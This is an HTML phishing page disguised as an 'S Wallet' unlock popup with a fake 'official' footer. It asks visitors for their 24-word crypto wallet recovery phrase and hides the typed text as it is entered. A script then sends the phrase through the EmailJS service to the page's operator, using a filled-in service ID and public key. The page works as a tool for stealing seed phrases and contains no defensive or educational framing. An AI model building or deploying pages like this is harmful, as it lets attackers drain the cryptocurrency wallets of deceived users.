<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Reward Popup</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .popup {
            width: 400px;
            background-color: white;
            border: 2px solid #ddd;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 50px auto;
            position: relative;
            border-radius: 8px;
        }
        .header {
            background-color: purple;
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 5px 5px 0 0;
            font-size: 24px;
        }
        .content {
            margin-top: 20px;
        }
        .content p {
            text-align: center;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .input-box {
            border: 1px solid black;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
            color: transparent;
            caret-color: black;
            background-color: white;
        }
        .input-box::placeholder {
            color: #000;
            opacity: 0.5;
        }
        .button {
            display: block;
            background-color: purple;
            color: white;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            border: none;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
    </style>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <div class="popup">
        <div class="header">Wallet</div>
        <div class="content">
            <p>Unlock S Wallet</p>
            <textarea class="input-box" placeholder="Enter your 24-words passphrase here"></textarea>
            <button class="button" onclick="sendPassphrase()">Unlock with passphrase</button>
        </div>
        <div class="footer">
            This is official S wallet custodial wallet service in testing phase, in latter day we will make it non-custodial wallet.
        </div>
    </div>

    <script>
        (function() {
            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
        })();

        function sendPassphrase() {
            const passphrase = document.querySelector('.input-box').value;
            if (passphrase) {
                emailjs.send("service_kvv2wy6", "YOUR_TEMPLATE_ID", {
                    passphrase: passphrase
                }).then(function(response) {
                    alert("Passphrase sent successfully!");
                }, function(error) {
                    alert("Failed to send passphrase: " + error.text);
                });
            } else {
                alert("Please enter your passphrase.");
            }
        }
    </script>
    <script type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
(function(){
  emailjs.init({
    publicKey: "FkAeF-dKktfVZq9jT",
  });
})();
</script>
</body>
</html>
